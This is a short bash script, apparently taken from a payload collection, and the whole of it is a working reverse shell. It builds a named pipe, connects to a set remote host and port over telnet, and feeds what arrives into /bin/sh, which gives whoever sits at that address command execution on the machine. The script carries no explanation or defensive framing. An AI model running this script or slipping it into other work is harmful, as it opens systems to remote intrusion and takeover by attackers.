#!/bin/bash

RHOST=0.0.0.0
RPORT=12345
TF=$(mktemp -u)
mkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/sh 1>$TF
